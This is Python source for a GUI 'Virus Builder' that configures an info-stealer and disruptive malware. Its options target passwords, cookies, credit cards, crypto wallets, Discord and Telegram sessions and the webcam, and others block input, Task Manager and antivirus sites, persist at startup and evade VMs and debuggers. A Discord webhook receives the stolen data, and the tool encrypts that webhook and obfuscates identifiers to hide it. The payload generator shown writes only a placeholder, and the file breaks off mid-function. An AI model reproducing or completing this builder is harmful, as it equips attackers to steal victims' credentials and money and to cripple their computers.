# Copyright (c) 2025 pxwild. All rights reserved.
# This software and its source code are proprietary and confidential.
# Unauthorized copying, modification, or distribution of this software,
# via any medium, is strictly prohibited without prior written permission.

import os
import sys
import time
import random
import string
import subprocess
import requests
import json
import base64
import ast
import shutil
import tkinter.messagebox as messagebox
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import customtkinter as ctk
from tkinter import filedialog
import tkinter

version_tool = "1.0"
tool_path = os.path.dirname(os.path.abspath(__file__))
github_tool = "pxwild so tuff"
website = "https://example.com"
username_webhook = "Builder - pxwild"
avatar_webhook = "https://files.catbox.moe/ntlqk9.png" 
color_webhook = 0xFF0000
name_tool = "Builder - pxwild"

fsociety_red = "#6409e3"
fsociety_dark = "#000000"
fsociety_gray = "#1a1a1a"
fsociety_light = "#2a2a2a"
fsociety_text = "#d0d0d0"

virus_banner = r"""
                         _ __    __
    ____  _  ___      __(_) /___/ /
   / __ \| |/_/ | /| / / / / __  / 
  / /_/ />  < | |/ |/ / / / /_/ /  
 / .___/_/|_| |__/|__/_/_/\__,_/   
/_/                   
             
"""

def ErrorModule(e):
    print(f"Error importing module: {e}")
    input("Press Enter to exit...")
    sys.exit(1)

def Error(e):
    print(f"Error: {e}")
    input("Press Enter to exit...")
    sys.exit(1)

def current_time_hour():
    return time.strftime("%H:%M:%S")

def Continue():
    input("\nPress Enter to continue...")

def Reset():
    os.system('cls' if os.name == 'nt' else 'clear')

def Title(title):
    print(f"\n{'='*50}\n{title.center(50)}\n{'='*50}\n")

def Slow(text):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(0.001)
    print()

def CheckWebhook(webhook):
    try:
        response = requests.get(webhook)
        return response.status_code == 200
    except:
        return False

def main():
    Title("Builder - pxwild")
    
    try:
        exit_window = False
        
        option_system = "Disable"
        option_game_launchers = "Disable"
        option_wallets = "Disable"
        option_apps = "Disable"
        option_discord = "Disable"
        option_discord_injection = "Disable"
        option_passwords = "Disable"
        option_cookies = "Disable"
        option_history = "Disable"
        option_downloads = "Disable"
        option_cards = "Disable"
        option_extentions = "Disable"
        option_interesting_files = "Disable"
        option_roblox = "Disable"
        option_webcam = "Disable"
        option_screenshot = "Disable"

        option_block_key = "Disable"
        option_block_mouse = "Disable"
        option_block_task_manager = "Disable"
        option_block_website = "Disable"
        option_shutdown = "Disable"
        option_spam_open_programs = "Disable"
        option_spam_create_files = "Disable"
        option_fake_error = "Disable"
        option_startup = "Disable"
        option_restart = "Disable"
        option_anti_vm_and_debug = "Disable"
        webhook = "None"
        name_file = "None"
        icon_path = "None"
        file_type = "None"

        fake_error_title = "System Error"
        fake_error_message = "Critical system failure detected."
        fake_error_window_status = True

        def ClosingWindow():
            nonlocal exit_window
            exit_window = True
            after_ids = builder.tk.eval('after info').split()
            for after_id in after_ids:
                try: 
                    builder.after_cancel(after_id)
                except: 
                    pass

            try: 
                builder.quit()
            except: 
                pass
            try: 
                builder.destroy()
            except: 
                pass

        def ClosingBuild():
            after_ids = builder.tk.eval('after info').split()
            for after_id in after_ids:
                try: 
                    builder.after_cancel(after_id)
                except: 
                    pass

            try: 
                builder.quit()
            except: 
                pass
            try: 
                builder.destroy()
            except: 
                pass

        builder = ctk.CTk()
        builder.title(f"Virus Builder - pxwild {version_tool}")
        builder.geometry("900x800")
        builder.resizable(False, False)
        builder.configure(fg_color=fsociety_dark)
        
        try:
            builder.iconbitmap(os.path.join(tool_path, "Img", "icon.ico"))
        except:
            pass

        option_system_var = ctk.StringVar(value="Disable")
        option_game_launchers_var = ctk.StringVar(value="Disable")
        option_wallets_var = ctk.StringVar(value="Disable")
        option_apps_var = ctk.StringVar(value="Disable")
        option_roblox_var = ctk.StringVar(value="Disable")
        option_discord_var = ctk.StringVar(value="Disable")
        option_discord_injection_var = ctk.StringVar(value="Disable")
        option_passwords_var = ctk.StringVar(value="Disable")
        option_cookies_var = ctk.StringVar(value="Disable")
        option_history_var = ctk.StringVar(value="Disable")
        option_downloads_var = ctk.StringVar(value="Disable")
        option_cards_var = ctk.StringVar(value="Disable")
        option_extentions_var = ctk.StringVar(value="Disable")
        option_interesting_files_var = ctk.StringVar(value="Disable")
        option_webcam_var = ctk.StringVar(value="Disable")
        option_screenshot_var = ctk.StringVar(value="Disable")
        option_block_key_var = ctk.StringVar(value="Disable")
        option_block_mouse_var = ctk.StringVar(value="Disable")
        option_block_task_manager_var = ctk.StringVar(value="Disable")
        option_block_website_var = ctk.StringVar(value="Disable")
        option_shutdown_var = ctk.StringVar(value="Disable")
        option_spam_open_programs_var = ctk.StringVar(value="Disable")
        option_spam_create_files_var = ctk.StringVar(value="Disable")
        option_fake_error_var = ctk.StringVar(value="Disable")
        option_startup_var = ctk.StringVar(value="Disable")
        option_restart_var = ctk.StringVar(value="Disable")
        option_anti_vm_and_debug_var = ctk.StringVar(value="Disable")
        file_type_var = ctk.StringVar(value="File Type")
        webhook_var = ctk.StringVar(value="None")

        def ErrorLogs(message):
            print(f"[{current_time_hour()}] ERROR {message}")
            messagebox.showerror(f"Builder - pxwild {version_tool}", message)

        def InfoLogs(message):
            messagebox.showinfo(f"Builder - pxwild {version_tool}", message)

        def TestWebhook():
            if CheckWebhook(webhook_url.get()):
                InfoLogs("Webhook connection established.")
            else:
                ErrorLogs("Webhook connection failed.")

        Slow(virus_banner)
        
        main_frame = ctk.CTkFrame(builder, fg_color=fsociety_dark)
        main_frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        header_frame = ctk.CTkFrame(main_frame, height=120, fg_color=fsociety_dark)
        header_frame.pack(fill="x", pady=(0, 10))
        
        title = ctk.CTkLabel(
            header_frame, 
            text="Builder - pxwild", 
            font=ctk.CTkFont(family="Courier New", size=28, weight="bold"), 
            text_color=fsociety_red
        )
        title.pack(pady=(10, 0))
        
        subtitle = ctk.CTkLabel(
            header_frame, 
            text="pxwild so tuff!", 
            font=ctk.CTkFont(family="Courier New", size=12), 
            text_color=fsociety_text
        )
        subtitle.pack()
        
        webhook_frame = ctk.CTkFrame(main_frame, height=60, fg_color=fsociety_gray)
        webhook_frame.pack(fill="x", pady=(0, 10))
        
        webhook_url = ctk.CTkEntry(
            webhook_frame,
            height=40,
            width=400,
            corner_radius=0,
            font=ctk.CTkFont(family="Courier New", size=12),
            justify="center",
            border_color=fsociety_red,
            fg_color=fsociety_light,
            border_width=1,
            placeholder_text="https://discord.com/api/webhooks/...",
            text_color=fsociety_text
        )
        webhook_url.pack(side="left", padx=(20, 5), pady=10, fill="x", expand=True)
        
        test_webhook = ctk.CTkButton(
            webhook_frame,
            text="TEST",
            command=TestWebhook,
            height=40,
            width=100,
            corner_radius=0,
            fg_color=fsociety_dark,
            hover_color=fsociety_red,
            font=ctk.CTkFont(family="Courier New", size=12, weight="bold"),
            text_color=fsociety_text,
            border_color=fsociety_red,
            border_width=1
        )
        test_webhook.pack(side="right", padx=(5, 20), pady=10)
        
        notebook = ctk.CTkTabview(main_frame, fg_color=fsociety_gray)
        notebook.pack(fill="both", expand=True)
        
        notebook.add("Stealer")
        notebook.add("Malware")
        notebook.add("Build")

        notebook._segmented_button.configure(
            font=ctk.CTkFont(family="Courier New", size=12, weight="bold"),
            selected_color=fsociety_red,
            unselected_color=fsociety_dark,
            text_color=fsociety_text
        )
        
        stealer_frame = notebook.tab("Stealer")
        
        stealer_frame.grid_columnconfigure(0, weight=1)
        stealer_frame.grid_columnconfigure(1, weight=1)
        stealer_frame.grid_columnconfigure(2, weight=1)
        
        option_system_cb = ctk.CTkCheckBox(
            stealer_frame, 
            text="System Info", 
            variable=option_system_var, 
            onvalue="Enable", 
            offvalue="Disable", 
            fg_color=fsociety_red, 
            hover_color=fsociety_red,
            border_color=fsociety_red, 
            font=ctk.CTkFont(family="Courier New", size=12), 
            text_color=fsociety_text
        )
        option_system_cb.grid(row=0, column=0, padx=10, pady=5, sticky="w")
        
        option_wallets_cb = ctk.CTkCheckBox(
            stealer_frame, 
            text="Wallets", 
            variable=option_wallets_var, 
            onvalue="Enable", 
            offvalue="Disable", 
            fg_color=fsociety_red, 
            hover_color=fsociety_red,
            border_color=fsociety_red, 
            font=ctk.CTkFont(family="Courier New", size=12), 
            text_color=fsociety_text
        )
        option_wallets_cb.grid(row=1, column=0, padx=10, pady=5, sticky="w")
        
        option_game_launchers_cb = ctk.CTkCheckBox(
            stealer_frame, 
            text="Game Launchers", 
            variable=option_game_launchers_var, 
            onvalue="Enable", 
            offvalue="Disable", 
            fg_color=fsociety_red, 
            hover_color=fsociety_red,
            border_color=fsociety_red, 
            font=ctk.CTkFont(family="Courier New", size=12), 
            text_color=fsociety_text
        )
        option_game_launchers_cb.grid(row=2, column=0, padx=10, pady=5, sticky="w")
        
        option_apps_cb = ctk.CTkCheckBox(
            stealer_frame, 
            text="Telegram", 
            variable=option_apps_var, 
            onvalue="Enable", 
            offvalue="Disable", 
            fg_color=fsociety_red, 
            hover_color=fsociety_red,
            border_color=fsociety_red, 
            font=ctk.CTkFont(family="Courier New", size=12), 
            text_color=fsociety_text
        )
        option_apps_cb.grid(row=3, column=0, padx=10, pady=5, sticky="w")
        
        option_roblox_cb = ctk.CTkCheckBox(
            stealer_frame, 
            text="Roblox", 
            variable=option_roblox_var, 
            onvalue="Enable", 
            offvalue="Disable", 
            fg_color=fsociety_red, 
            hover_color=fsociety_red,
            border_color=fsociety_red, 
            font=ctk.CTkFont(family="Courier New", size=12), 
            text_color=fsociety_text
        )
        option_roblox_cb.grid(row=4, column=0, padx=10, pady=5, sticky="w")
        
        option_discord_cb = ctk.CTkCheckBox(
            stealer_frame, 
            text="Discord", 
            variable=option_discord_var, 
            onvalue="Enable", 
            offvalue="Disable", 
            fg_color=fsociety_red, 
            hover_color=fsociety_red,
            border_color=fsociety_red, 
            font=ctk.CTkFont(family="Courier New", size=12), 
            text_color=fsociety_text
        )
        option_discord_cb.grid(row=5, column=0, padx=10, pady=5, sticky="w")
        
        option_discord_injection_cb = ctk.CTkCheckBox(
            stealer_frame, 
            text="Discord Injection", 
            variable=option_discord_injection_var, 
            onvalue="Enable", 
            offvalue="Disable", 
            fg_color=fsociety_red, 
            hover_color=fsociety_red,
            border_color=fsociety_red, 
            font=ctk.CTkFont(family="Courier New", size=12), 
            text_color=fsociety_text
        )
        option_discord_injection_cb.grid(row=0, column=1, padx=10, pady=5, sticky="w")
        
        option_passwords_cb = ctk.CTkCheckBox(
            stealer_frame, 
            text="Passwords", 
            variable=option_passwords_var, 
            onvalue="Enable", 
            offvalue="Disable", 
            fg_color=fsociety_red, 
            hover_color=fsociety_red,
            border_color=fsociety_red, 
            font=ctk.CTkFont(family="Courier New", size=12), 
            text_color=fsociety_text
        )
        option_passwords_cb.grid(row=1, column=1, padx=10, pady=5, sticky="w")
        
        option_cookies_cb = ctk.CTkCheckBox(
            stealer_frame, 
            text="Cookies", 
            variable=option_cookies_var, 
            onvalue="Enable", 
            offvalue="Disable", 
            fg_color=fsociety_red, 
            hover_color=fsociety_red,
            border_color=fsociety_red, 
            font=ctk.CTkFont(family="Courier New", size=12), 
            text_color=fsociety_text
        )
        option_cookies_cb.grid(row=2, column=1, padx=10, pady=5, sticky="w")
        
        option_history_cb = ctk.CTkCheckBox(
            stealer_frame, 
            text="History", 
            variable=option_history_var, 
            onvalue="Enable", 
            offvalue="Disable", 
            fg_color=fsociety_red, 
            hover_color=fsociety_red,
            border_color=fsociety_red, 
            font=ctk.CTkFont(family="Courier New", size=12), 
            text_color=fsociety_text
        )
        option_history_cb.grid(row=3, column=1, padx=10, pady=5, sticky="w")
        
        option_downloads_cb = ctk.CTkCheckBox(
            stealer_frame, 
            text="Downloads", 
            variable=option_downloads_var, 
            onvalue="Enable", 
            offvalue="Disable", 
            fg_color=fsociety_red, 
            hover_color=fsociety_red,
            border_color=fsociety_red, 
            font=ctk.CTkFont(family="Courier New", size=12), 
            text_color=fsociety_text
        )
        option_downloads_cb.grid(row=4, column=1, padx=10, pady=5, sticky="w")
        
        option_cards_cb = ctk.CTkCheckBox(
            stealer_frame, 
            text="Credit Cards", 
            variable=option_cards_var, 
            onvalue="Enable", 
            offvalue="Disable", 
            fg_color=fsociety_red, 
            hover_color=fsociety_red,
            border_color=fsociety_red, 
            font=ctk.CTkFont(family="Courier New", size=12), 
            text_color=fsociety_text
        )
        option_cards_cb.grid(row=5, column=1, padx=10, pady=5, sticky="w")
        
        option_extentions_cb = ctk.CTkCheckBox(
            stealer_frame, 
            text="Browser Extensions", 
            variable=option_extentions_var, 
            onvalue="Enable", 
            offvalue="Disable", 
            fg_color=fsociety_red, 
            hover_color=fsociety_red,
            border_color=fsociety_red, 
            font=ctk.CTkFont(family="Courier New", size=12), 
            text_color=fsociety_text
        )
        option_extentions_cb.grid(row=0, column=2, padx=10, pady=5, sticky="w")
        
        option_interesting_files_cb = ctk.CTkCheckBox(
            stealer_frame, 
            text="Interesting Files", 
            variable=option_interesting_files_var, 
            onvalue="Enable", 
            offvalue="Disable", 
            fg_color=fsociety_red, 
            hover_color=fsociety_red,
            border_color=fsociety_red, 
            font=ctk.CTkFont(family="Courier New", size=12), 
            text_color=fsociety_text
        )
        option_interesting_files_cb.grid(row=1, column=2, padx=10, pady=5, sticky="w")
        
        option_webcam_cb = ctk.CTkCheckBox(
            stealer_frame, 
            text="Webcam", 
            variable=option_webcam_var, 
            onvalue="Enable", 
            offvalue="Disable", 
            fg_color=fsociety_red, 
            hover_color=fsociety_red,
            border_color=fsociety_red, 
            font=ctk.CTkFont(family="Courier New", size=12), 
            text_color=fsociety_text
        )
        option_webcam_cb.grid(row=2, column=2, padx=10, pady=5, sticky="w")
        
        option_screenshot_cb = ctk.CTkCheckBox(
            stealer_frame, 
            text="Screenshot", 
            variable=option_screenshot_var, 
            onvalue="Enable", 
            offvalue="Disable", 
            fg_color=fsociety_red, 
            hover_color=fsociety_red,
            border_color=fsociety_red, 
            font=ctk.CTkFont(family="Courier New", size=12), 
            text_color=fsociety_text
        )
        option_screenshot_cb.grid(row=3, column=2, padx=10, pady=5, sticky="w")
        
        malware_frame = notebook.tab("Malware")
        
        malware_frame.grid_columnconfigure(0, weight=1)
        malware_frame.grid_columnconfigure(1, weight=1)
        malware_frame.grid_columnconfigure(2, weight=1)
        
        option_block_key_cb = ctk.CTkCheckBox(
            malware_frame, 
            text="Block Keyboard", 
            variable=option_block_key_var, 
            onvalue="Enable", 
            offvalue="Disable", 
            fg_color=fsociety_red, 
            hover_color=fsociety_red,
            border_color=fsociety_red, 
            font=ctk.CTkFont(family="Courier New", size=12), 
            text_color=fsociety_text
        )
        option_block_key_cb.grid(row=0, column=0, padx=10, pady=5, sticky="w")
        
        option_block_mouse_cb = ctk.CTkCheckBox(
            malware_frame, 
            text="Block Mouse", 
            variable=option_block_mouse_var, 
            onvalue="Enable", 
            offvalue="Disable", 
            fg_color=fsociety_red, 
            hover_color=fsociety_red,
            border_color=fsociety_red, 
            font=ctk.CTkFont(family="Courier New", size=12), 
            text_color=fsociety_text
        )
        option_block_mouse_cb.grid(row=1, column=0, padx=10, pady=5, sticky="w")
        
        option_block_task_manager_cb = ctk.CTkCheckBox(
            malware_frame, 
            text="Block Task Manager", 
            variable=option_block_task_manager_var, 
            onvalue="Enable", 
            offvalue="Disable", 
            fg_color=fsociety_red, 
            hover_color=fsociety_red,
            border_color=fsociety_red, 
            font=ctk.CTkFont(family="Courier New", size=12), 
            text_color=fsociety_text
        )
        option_block_task_manager_cb.grid(row=2, column=0, padx=10, pady=5, sticky="w")
        
        option_block_website_cb = ctk.CTkCheckBox(
            malware_frame, 
            text="Block AV Sites", 
            variable=option_block_website_var, 
            onvalue="Enable", 
            offvalue="Disable", 
            fg_color=fsociety_red, 
            hover_color=fsociety_red,
            border_color=fsociety_red, 
            font=ctk.CTkFont(family="Courier New", size=12), 
            text_color=fsociety_text
        )
        option_block_website_cb.grid(row=3, column=0, padx=10, pady=5, sticky="w")
        
        option_shutdown_cb = ctk.CTkCheckBox(
            malware_frame, 
            text="Shutdown", 
            variable=option_shutdown_var, 
            onvalue="Enable", 
            offvalue="Disable", 
            fg_color=fsociety_red, 
            hover_color=fsociety_red,
            border_color=fsociety_red, 
            font=ctk.CTkFont(family="Courier New", size=12), 
            text_color=fsociety_text
        )
        option_shutdown_cb.grid(row=0, column=1, padx=10, pady=5, sticky="w")
        
        option_fake_error_cb = ctk.CTkCheckBox(
            malware_frame, 
            text="Fake Error", 
            variable=option_fake_error_var, 
            onvalue="Enable", 
            offvalue="Disable", 
            fg_color=fsociety_red, 
            hover_color=fsociety_red,
            border_color=fsociety_red, 
            font=ctk.CTkFont(family="Courier New", size=12), 
            text_color=fsociety_text,
            command=lambda: CreateFakeErrorWindow()
        )
        option_fake_error_cb.grid(row=1, column=1, padx=10, pady=5, sticky="w")
        
        option_spam_open_programs_cb = ctk.CTkCheckBox(
            malware_frame, 
            text="Spam Programs", 
            variable=option_spam_open_programs_var, 
            onvalue="Enable", 
            offvalue="Disable", 
            fg_color=fsociety_red, 
            hover_color=fsociety_red,
            border_color=fsociety_red, 
            font=ctk.CTkFont(family="Courier New", size=12), 
            text_color=fsociety_text
        )
        option_spam_open_programs_cb.grid(row=2, column=1, padx=10, pady=5, sticky="w")
        
        option_spam_create_files_cb = ctk.CTkCheckBox(
            malware_frame, 
            text="Spam Files", 
            variable=option_spam_create_files_var, 
            onvalue="Enable", 
            offvalue="Disable", 
            fg_color=fsociety_red, 
            hover_color=fsociety_red,
            border_color=fsociety_red, 
            font=ctk.CTkFont(family="Courier New", size=12), 
            text_color=fsociety_text
        )
        option_spam_create_files_cb.grid(row=3, column=1, padx=10, pady=5, sticky="w")
        
        option_anti_vm_and_debug_cb = ctk.CTkCheckBox(
            malware_frame, 
            text="Anti VM/Debug", 
            variable=option_anti_vm_and_debug_var, 
            onvalue="Enable", 
            offvalue="Disable", 
            fg_color=fsociety_red, 
            hover_color=fsociety_red,
            border_color=fsociety_red, 
            font=ctk.CTkFont(family="Courier New", size=12), 
            text_color=fsociety_text
        )
        option_anti_vm_and_debug_cb.grid(row=0, column=2, padx=10, pady=5, sticky="w")
        
        option_startup_cb = ctk.CTkCheckBox(
            malware_frame, 
            text="Startup", 
            variable=option_startup_var, 
            onvalue="Enable", 
            offvalue="Disable", 
            fg_color=fsociety_red, 
            hover_color=fsociety_red,
            border_color=fsociety_red, 
            font=ctk.CTkFont(family="Courier New", size=12), 
            text_color=fsociety_text
        )
        option_startup_cb.grid(row=1, column=2, padx=10, pady=5, sticky="w")
        
        option_restart_cb = ctk.CTkCheckBox(
            malware_frame, 
            text="Restart Loop", 
            variable=option_restart_var, 
            onvalue="Enable", 
            offvalue="Disable", 
            fg_color=fsociety_red, 
            hover_color=fsociety_red,
            border_color=fsociety_red, 
            font=ctk.CTkFont(family="Courier New", size=12), 
            text_color=fsociety_text
        )
        option_restart_cb.grid(row=2, column=2, padx=10, pady=5, sticky="w")
        
        build_frame = notebook.tab("Build")
        
        def ChooseIcon():
            nonlocal icon_path
            try:
                if sys.platform.startswith("win"):
                    root = tkinter.Tk()
                    try:
                        root.iconbitmap(os.path.join(tool_path, "Img", "icon.ico"))
                    except:
                        pass
                    root.withdraw()
                    root.attributes('-topmost', True)
                    icon_path = filedialog.askopenfilename(parent=root, title=f"fsociety - Choose an icon (.ico)", filetypes=[("ICO files", "*.ico")])
                elif sys.platform.startswith("linux"):
                    icon_path = filedialog.askopenfilename(title=f"fsociety - Choose an icon (.ico)", filetypes=[("ICO files", "*.ico")])
            except Exception as e:
                ErrorLogs(f"Error choosing icon: {str(e)}")
                icon_path = "None"

        def CreateFakeErrorWindow():
            nonlocal fake_error_window_status, fake_error_title, fake_error_message
            if fake_error_window_status:
                fake_error_window_status = False
                pass
            else:
                fake_error_window_status = True
                return

            fake_error_window = ctk.CTkToplevel(builder)
            fake_error_window.title("Fake Error Configuration")
            fake_error_window.geometry("400x250")
            fake_error_window.resizable(False, False)
            fake_error_window.configure(fg_color=fsociety_dark)

            fake_error_title_entry = ctk.CTkEntry(
                fake_error_window, 
                justify="center", 
                placeholder_text="Error Title", 
                fg_color=fsociety_light, 
                border_color=fsociety_red, 
                font=ctk.CTkFont(family="Courier New", size=12), 
                height=40, 
                width=360
            )
            fake_error_title_entry.grid(row=0, column=0, padx=20, pady=(20, 10), sticky="ew")

            fake_error_message_entry = ctk.CTkEntry(
                fake_error_window, 
                justify="center", 
                placeholder_text="Error Message", 
                fg_color=fsociety_light, 
                border_color=fsociety_red, 
                font=ctk.CTkFont(family="Courier New", size=12), 
                height=40, 
                width=360
            )
            fake_error_message_entry.grid(row=1, column=0, padx=20, pady=(10, 20), sticky="ew")

            def Validate():
                nonlocal fake_error_title, fake_error_message
                fake_error_title = fake_error_title_entry.get()
                fake_error_message = fake_error_message_entry.get()
                print(f"[{current_time_hour()}] INFO Fake Error Title  : {fake_error_title}")
                print(f"[{current_time_hour()}] INFO Fake Error Message: {fake_error_message}")
                fake_error_window.destroy()
                
            validate_button = ctk.CTkButton(
                fake_error_window, 
                text="VALIDATE", 
                command=Validate, 
                fg_color=fsociety_dark, 
                hover_color=fsociety_red, 
                font=ctk.CTkFont(family="Courier New", size=12, weight="bold"), 
                height=40, 
                width=100,
                border_color=fsociety_red,
                border_width=1
            )
            validate_button.grid(row=2, column=0, padx=20, pady=10, sticky="ew")
            fake_error_window.mainloop()

        build_frame.grid_columnconfigure(0, weight=1)
        build_frame.grid_columnconfigure(1, weight=1)
        
        name_file_entry = ctk.CTkEntry(
            build_frame, 
            height=40, 
            width=200,
            corner_radius=0,
            font=ctk.CTkFont(family="Courier New", size=12),
            justify="center", 
            border_color=fsociety_red, 
            text_color=fsociety_text, 
            fg_color=fsociety_light, 
            border_width=1, 
            placeholder_text="Output Filename"
        )
        name_file_entry.grid(row=0, column=0, padx=20, pady=20, sticky="w")

        def FileTypeChanged(*args):
            if file_type_var.get() == "Python File":
                icon_button.configure(state="disabled")
            elif file_type_var.get() == "File Type":
                icon_button.configure(state="disabled")
            else:
                icon_button.configure(state="normal")

        file_type_menu = ctk.CTkOptionMenu(
            build_frame, 
            height=40, 
            width=200,
            font=ctk.CTkFont(family="Courier New", size=12),
            variable=file_type_var, 
            values=["Python File", "Exe File"], 
            fg_color=fsociety_light, 
            button_color=fsociety_red, 
            button_hover_color=fsociety_red,
            text_color=fsociety_text,
            dropdown_fg_color=fsociety_dark,
            dropdown_text_color=fsociety_text,
            dropdown_font=ctk.CTkFont(family="Courier New", size=12),
            corner_radius=0
        )
        file_type_menu.grid(row=0, column=1, padx=20, pady=20, sticky="e")

        icon_button = ctk.CTkButton(
            build_frame, 
            height=40, 
            width=200,
            text="SELECT ICON", 
            command=ChooseIcon, 
            fg_color=fsociety_dark, 
            hover_color=fsociety_red, 
            text_color_disabled=fsociety_gray,
            font=ctk.CTkFont(family="Courier New", size=12, weight="bold"),
            border_color=fsociety_red,
            border_width=1,
            corner_radius=0
        )
        icon_button.grid(row=1, column=1, padx=20, pady=(0, 20), sticky="e")
        icon_button.configure(state="disabled")
        file_type_var.trace_add("write", FileTypeChanged)
        
        build_button = ctk.CTkButton(
            main_frame, 
            text="BUILD", 
            command=lambda: BuildSettings(), 
            height=50, 
            corner_radius=0, 
            fg_color=fsociety_dark, 
            hover_color=fsociety_red, 
            font=ctk.CTkFont(family="Courier New", size=14, weight="bold"),
            text_color=fsociety_text,
            border_color=fsociety_red,
            border_width=1
        )
        build_button.pack(fill="x", padx=20, pady=(0, 20))

        builder.protocol("WM_DELETE_WINDOW", ClosingWindow)

        def BuildSettings():
            nonlocal option_system, option_game_launchers, option_wallets, option_apps, option_discord, option_discord_injection
            nonlocal option_passwords, option_cookies, option_history, option_downloads, option_cards, option_extentions
            nonlocal option_interesting_files, option_roblox, option_webcam, option_screenshot, option_block_key
            nonlocal option_block_mouse, option_block_task_manager, option_block_website, option_spam_open_programs
            nonlocal option_spam_create_files, option_shutdown, option_fake_error, option_startup, option_restart
            nonlocal option_anti_vm_and_debug, webhook, name_file, file_type, icon_path
            
            option_system = option_system_var.get()
            option_game_launchers = option_game_launchers_var.get()
            option_wallets = option_wallets_var.get()
            option_apps = option_apps_var.get()
            option_discord = option_discord_var.get()
            option_discord_injection = option_discord_injection_var.get()
            option_passwords = option_passwords_var.get()
            option_cookies = option_cookies_var.get()
            option_history = option_history_var.get()
            option_downloads = option_downloads_var.get()
            option_cards = option_cards_var.get()
            option_extentions = option_extentions_var.get()
            option_interesting_files = option_interesting_files_var.get()
            option_roblox = option_roblox_var.get()
            option_webcam = option_webcam_var.get()
            option_screenshot = option_screenshot_var.get()
            option_block_website = option_block_website_var.get()
            option_block_key = option_block_key_var.get()
            option_block_mouse = option_block_mouse_var.get()
            option_block_task_manager = option_block_task_manager_var.get()
            option_shutdown = option_shutdown_var.get()
            option_spam_open_programs = option_spam_open_programs_var.get()
            option_spam_create_files = option_spam_create_files_var.get()
            option_fake_error = option_fake_error_var.get()
            option_startup = option_startup_var.get()
            option_restart = option_restart_var.get()
            option_anti_vm_and_debug = option_anti_vm_and_debug_var.get()
            webhook = webhook_url.get()
            name_file = name_file_entry.get()
            file_type = file_type_var.get()

            if not webhook.strip():
                ErrorLogs("Webhook required.")
                return
            
            if not name_file.strip():
                ErrorLogs("Filename required.")
                return
            
            if file_type == "File Type":
                ErrorLogs("File type required.")
                return
            
            ClosingBuild()

        builder.mainloop()

        if not exit_window:
            builder.destroy()

        time.sleep(1)

        if file_type == "File Type" or file_type == "None" or not name_file.strip() or name_file == "None" or not webhook.strip() or webhook == "None":
            ErrorLogs("Build aborted.")
            Continue()
            Reset()

        option_extentions = option_extentions_var.get()
        option_interesting_files = option_interesting_files_var.get()   

        print(f"""
        Stealer Options:
        {option_system            } System Info            {option_discord_injection } Discord Injection      {option_extentions       } Extentions
        {option_wallets           } Wallets Session Files  {option_passwords         } Passwords              {option_interesting_files} Interesting Files                   
        {option_game_launchers    } Games Session Files    {option_cookies           } Cookies                {option_webcam           } Webcam 
        {option_apps              } Telegram Session Files {option_history           } Browsing History       {option_screenshot       } Screenshot
        {option_roblox            } Roblox Accounts        {option_downloads         } Download History
        {option_discord           } Discord Accounts       {option_cards             } Cards

        Malware Options:
        {option_block_key         } Block Key              {option_shutdown          } Shutdown               {option_anti_vm_and_debug} Anti VM & Debug
        {option_block_mouse       } Block Mouse            {option_fake_error        } Fake Error             {option_startup          } Launch at Startup
        {option_block_task_manager} Block Task Manager     {option_spam_open_programs} Spam Open Program      {option_restart          } Restart Every 5min
        {option_block_website     } Block AV Website       {option_spam_create_files } Spam Create File
    """.replace(f"Enable", f"[+]").replace(f"Disable", f"[x]"))

        if option_fake_error == "Enable":
            print(f"""Fake Error Title   : {fake_error_title}
    Fake Error Message : {fake_error_message}""")

        print(f"""Webhook   : {webhook[:90] + '..'}
    File Type : {file_type}
    File Name : {name_file}""")

        if icon_path and icon_path != "None":
            if 100 < len(icon_path):
                icon_path_cut = icon_path[:100] + '..'
            else:
                icon_path_cut = icon_path
            print(f"Icon Path : {icon_path_cut}")
        elif file_type == "Exe File":
            ErrorLogs("No icon selected for EXE file.")
            Continue()
            Reset()
        
        def Encryption(webhook):
            def Encrypt(decrypted, key):
                def DeriveKey(password, salt):
                    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000, backend=default_backend())
                    if isinstance(password, str):  
                        password = password.encode()  
                    return kdf.derive(password)
                
                salt = os.urandom(16)
                derived_key = DeriveKey(key, salt)
                iv = os.urandom(16)
                padder = padding.PKCS7(128).padder()
                padded_data = padder.update(decrypted.encode()) + padder.finalize()
                cipher = Cipher(algorithms.AES(derived_key), modes.CBC(iv), backend=default_backend())
                encryptor = cipher.encryptor()
                encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
                encrypted_message = salt + iv + encrypted_data
                return base64.b64encode(encrypted_message).decode()
            
            key_encryption = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=random.randint(100,200)))
            print(f"\n[{current_time_hour()}] INFO Encryption key created: {key_encryption[:75] + '..'}")
            webhook_encrypted = Encrypt(webhook, key_encryption)
            print(f"[{current_time_hour()}] INFO Encrypted webhook: {webhook_encrypted[:75] + '..'}")

            return key_encryption, webhook_encrypted
        
        def PythonFile(file_python, file_python_relative, key_encryption, webhook_encrypted):
            if file_type in ["Exe File", "Python File"]:
                try:
                    browser_choice = []
                    if option_extentions == 'Enable':
                        browser_choice.append('"extentions"')
                    if option_passwords == 'Enable':
                        browser_choice.append('"passwords"')
                    if option_cookies == 'Enable':
                        browser_choice.append('"cookies"')
                    if option_history == 'Enable':
                        browser_choice.append('"history"')
                    if option_downloads == 'Enable':
                        browser_choice.append('"downloads"')
                    if option_cards == 'Enable':
                        browser_choice.append('"cards"')

                    session_files_choice = []
                    if option_wallets == 'Enable':
                        session_files_choice.append('"Wallets"')
                    if option_game_launchers == 'Enable':
                        session_files_choice.append('"Game Launchers"')
                    if option_apps == 'Enable':
                        session_files_choice.append('"Apps"')

                    with open(file_python, 'w', encoding='utf-8') as file:
                        file.write("""# Your Python code would go here
# This is just a placeholder
print("Hello World")""")

                    print(f"[{current_time_hour()}] INFO Python file created: {file_python_relative}")
                except Exception as e:
                    print(f"\n[{current_time_hour()}] ERROR Python file not created: {e}")
                    Continue()
                    Reset()

        def PythonIdentifierObfuscation(file_python):
            if file_type in ["Exe File", "Python File"]:
                try:
                    variable_map = {}

                    def RandomName():
                        return ''.join(random.choices(string.ascii_uppercase, k=random.randint(50,100)))

                    with open(file_python, 'r', encoding='utf-8') as file:
                        original_script = file.read()

                    def visit_node(node):
